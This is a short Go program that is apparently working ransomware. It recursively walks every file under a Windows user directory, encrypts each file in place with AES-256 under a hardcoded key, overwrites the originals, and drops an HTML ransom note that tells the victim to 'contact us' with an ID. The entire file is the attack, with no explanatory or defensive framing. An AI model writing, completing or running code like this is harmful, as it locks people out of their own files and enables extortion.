package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"io"

	// "encoding/hex"
	"fmt"
	"os"
	"path/filepath"
)

func main() {
	key := []byte("thisisaverysecure32bytekeyphrase") // 32 bytes for AES-256
	directory := "C:\\Users\\user1"

	filepath.Walk(directory, func(path string, info os.FileInfo, err error) error {
		if !info.IsDir() {
			encryptFile(path, key)
		}
		return nil
	})

	createHTMLInstructions("instructions.html")
}

func encryptFile(filename string, key []byte) {
	plaintext, err := os.ReadFile(filename)
	if err != nil {
		fmt.Println(err)
		return
	}

	block, err := aes.NewCipher(key)
	if err != nil {
		fmt.Println(err)
		return
	}

	ciphertext := make([]byte, aes.BlockSize+len(plaintext))
	iv := ciphertext[:aes.BlockSize]
	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
		fmt.Println(err)
		return
	}

	stream := cipher.NewCFBEncrypter(block, iv)
	stream.XORKeyStream(ciphertext[aes.BlockSize:], plaintext)

	err = os.WriteFile(filename, ciphertext, 0777)
	if err != nil {
		fmt.Println(err)
		return
	}
}

func createHTMLInstructions(filename string) {
	htmlContent := `
    <html>
    <body>
    <h1>Files Encrypted</h1>
    <p>Your files have been encrypted. To decrypt them, contact us with the following ID:</p>
    <p><b>YourID12345</b></p>
    </body>
    </html>`

	err := os.WriteFile(filename, []byte(htmlContent), 0644)
	if err != nil {
		fmt.Println(err)
		return
	}
}
